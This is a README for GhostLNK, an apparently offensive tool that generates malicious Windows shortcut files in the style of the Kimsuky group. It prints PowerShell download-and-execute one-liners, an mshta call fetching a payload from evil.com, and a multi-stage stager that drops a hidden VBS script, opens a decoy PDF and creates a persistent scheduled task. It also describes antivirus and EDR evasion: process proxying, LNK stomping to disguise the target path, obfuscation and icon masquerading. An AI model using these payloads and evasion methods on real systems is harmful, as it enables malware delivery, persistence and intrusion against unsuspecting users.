<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=3000&pause=500&color=6A1F7A&center=true&vCenter=true&width=600&lines=GhostLNK;Advanced+LNK+Generator+%2B+Evasion;Kimsuky+Inspired+Tradecraft" alt="GhostLNK" />
</p>

<p align="center">
  <!-- Badges -->
  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
  <a href="https://www.riverbankcomputing.com/software/pyqt/"><img src="https://img.shields.io/badge/PyQt6-6.0+-41CD52?style=for-the-badge&logo=qt&logoColor=white" alt="PyQt6"></a>
  <a href="https://www.microsoft.com/windows"><img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License"></a>
  <a href="https://github.com/Excalibra"><img src="https://img.shields.io/badge/GitHub-Excalibra-181717?style=for-the-badge&logo=github" alt="GitHub"></a>
</p>

<p align="center">
  <img width="900" alt="GhostLNK Interface" src="https://github.com/user-attachments/assets/532f7d0e-b985-41da-8b7d-cb1e04c91ae6">
</p>

---

## 🧬 Overview

**GhostLNK** is a state‑of‑the‑art Windows LNK (shortcut) generator that blends advanced evasion, modular staging, and a retro‑inspired interface. It equips red teams and security researchers with the tools to simulate nation‑state tradecraft—bypassing modern EDR signatures while maintaining convincing disguises.

> [!IMPORTANT]
> This tool is intended **exclusively** for authorized security testing, education, and research. Unauthorized use is strictly prohibited.

---

## 🧰 Key Features

### 🚀 Core Payload Engines

| Mode | Description |
|------|-------------|
| 📥 **Download & Open** | Fetch a remote file, save to temp, and open with default app. |
| ⚡ **Memory Execute** | Run a PowerShell script directly in memory—no disk footprint. |
| 🥷 **Ultra Stealth** | Minimal output, heavily obfuscated commands for maximum AV evasion. |
| 🎯 **Raw Target** | Bypass PowerShell entirely: run any EXE with custom arguments. |

### 🛡️ Advanced Evasion (Kimsuky‑Inspired)

| Technique | Effect |
|-----------|--------|
| 🔀 **conhost.exe Proxy** | Launches PowerShell via the trusted `conhost.exe` to defeat parent‑process monitoring. |
| 🎭 **LNK Stomping** | Spoofs the displayed target path (e.g., `invoice.pdf`) while executing the real payload. |
| 📡 **regsvr32 Proxy** | Fileless execution of remote SCT/DLL using `regsvr32.exe`. |
| 🧩 **Multi‑Stage Stager** | LNK → hidden VBS → decoy PDF → scheduled task → final payload. |
| 🔐 **XOR Encoding** | Encrypts embedded scripts with a user‑supplied key. |
| 🧵 **String Obfuscation** | Splits suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |

### 🎚️ Stealth Levels

| Level | Behavior | AV Evasion |
|-------|----------|------------|
| **0 – Normal** | Standard output, visible window | Low |
| **1 – Moderate** | PowerShell aliases, no obvious flags | Medium |
| **2 – Maximum** | Obfuscated code, no `-WindowStyle Hidden` | High |

### 🖥️ Professional Interface

- **Two‑Column Header** – Title & credits on the left, live console on the right.
- **Neon Matrix Aesthetic** – High‑contrast monospaced theme for readability.
- **Step‑by‑Step Workflow** – Numbered stages with visual progress indicators.
- **Smart Conflict Resolution** – Incompatible options auto‑disable with tooltip explanations.
- **Live Dropbox Validation** – Instant feedback on `dl=1` parameter.
- **Icon Masquerading** – 8+ realistic file icons (PDF, Word, Excel, etc.).
- **Recent History** – Quick recall of previous URLs and conversions.

---

## 📦 Installation

### Prerequisites
- **Python 3.8+**
- **Windows OS** (LNK generation requires Windows API structures)

### One‑Liner Setup
```bash
git clone https://github.com/Excalibra/GhostLNK.git
cd GhostLNK
pip install PyQt6 pylnk3   # Auto‑installed on first run if missing
python ghostlnk.py
```

> GhostLNK automatically installs missing dependencies when launched.

---

## 🧪 Usage Guide

### 🚀 Quick Start (PowerShell Payload)

1. **Enter URL** – e.g., a Dropbox link with `&dl=1`.
2. **Choose Payload Type** – Download & Open, Memory Execute, or Ultra Stealth.
3. **Set Stealth Level** – 0 (normal) to 2 (maximum obfuscation).
4. **Execution Options** – Pause, debug, or hide window.
5. **Generate** – Follow the numbered buttons: Show → Encode → Copy → Use.

```
[1] Show Command   → preview
[2] Encode         → base64
[3] Copy -E        → clipboard
[4] Use in LNK     → load into generator
```

### 🔧 Raw Target Mode
Enable **Raw Target Mode** to launch any executable directly:
```
Target: C:\Windows\System32\mshta.exe
Args:   "https://evil.com/payload.hta"
```

### 🧬 Embedded Payload (No Network)
Paste a PowerShell script directly into the **Embedded Payload** area. Enable XOR encoding or string obfuscation for extra stealth. The generated LNK contains a self‑decoding stub that runs entirely from the command line.

### 🧩 Multi‑Stage Stager (Kimsuky Style)
1. Check **Multi‑Stage Stager**.
2. Provide a **Decoy PDF URL** (opened immediately).
3. Provide the **Final Payload URL** (executed via scheduled task).
The LNK drops a VBS script in a hidden folder, opens the decoy, and creates a persistent scheduled task with a random GUID name.

---

## 🧠 Stealth Deep Dive

### Why Stealth Matters
EDRs and AVs flag:
- `-WindowStyle Hidden` flags
- Long, high‑entropy Base64 strings
- Suspicious parent‑child process relationships

### Maximum Stealth (Level 2) Example
```powershell
# Instead of:
powershell.exe -WindowStyle Hidden -E SQBFAFgAIAAoAE4AZ...

# GhostLNK Level 2 produces:
powershell.exe -E SQBFAFgAIAAoAE4AZ...   # Payload internally uses iex (wget -useb ...)
```

### LNK Stomping in Action
The LNK’s internal `LinkTargetIDList` is deliberately malformed. Windows Explorer “corrects” the displayed path to a benign file (e.g., `C:\Users\Public\Documents\invoice.pdf`), while the actual command still executes.

---

## 📁 Configuration

### `ghostlnk_config.json`
```json
{
  "recent_urls": ["https://dropbox.com/...", "http://vps/file.pdf"],
  "recent_conversions": ["-E SQBFAFgAIAAoAE4AZ..."]
}
```

### Custom Icons
Edit `ICON_DATABASE` in `ghostlnk.py`:
```python
ICON_DATABASE = {
    "My App": (r"C:\Path\to\app.exe", 0, ".custom"),
}
```

---

## 🧬 Payload Examples

### Download & Open (Level 2)
```powershell
$u="https://dropbox.com/file.pdf?dl=1";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";
```

### Memory Execute (Level 2)
```powershell
iex (wget -useb "https://your-server.com/script.ps1");
```

### Raw Target (mshta)
```
Target: C:\Windows\System32\mshta.exe
Args:   "https://example.com/update.hta"
```

### Multi‑Stage Stager Output
- **LNK**: runs PowerShell that creates `%APPDATA%\Microsoft\MicrosoftEdge_XXXXX\update.vbs`
- **VBS**: opens decoy PDF and schedules a hidden task
- **Task**: executes `iex (iwr 'http://payload/launcher.ps1')`

---

## 🧰 Troubleshooting

| Symptom | Likely Fix |
|---------|------------|
| LNK doesn't execute | Verify URL accessibility and `dl=1` on Dropbox. |
| AV still detects | Increase stealth to Level 2, use Memory Execute, or enable **regsvr32** / **Multi‑Stage**. |
| GUI won't start | `pip install PyQt6 pylnk3` manually. |
| Buttons stay grayed out | Update to latest code; conflict logic was refined. |
| Import doesn't add `-E` | Click the **Import** button after pasting. |

---

## 📚 Educational Resources

- [Microsoft LNK Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
- [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
- [Red Team LNK Tradecraft](https://redteam.guide/docs/Execution/LNK)

---

## ⚖️ Legal & Ethical Use

> [!CAUTION]
> GhostLNK is **only** for:
> - ✅ Authorized penetration testing
> - ✅ Educational demonstrations
> - ✅ Defensive research
>
> Unauthorized use violates laws and is strictly prohibited.

---

## 🤝 Contributing

1. Fork the repo
2. Create a feature branch (`git checkout -b feature/amazing`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push (`git push origin feature/amazing`)
5. Open a Pull Request

---

## 🙏 Acknowledgments

- **pylnk3** for core LNK manipulation
- The security research community for continuous inspiration
- APT tradecraft that drives defensive innovation

---

<p align="center">
  <b>GhostLNK – Evasion at the Edge of Tradecraft</b><br>
  <sub>For authorized use only</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Windows-10%2F11-lightgrey?style=flat-square">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square">
</p>
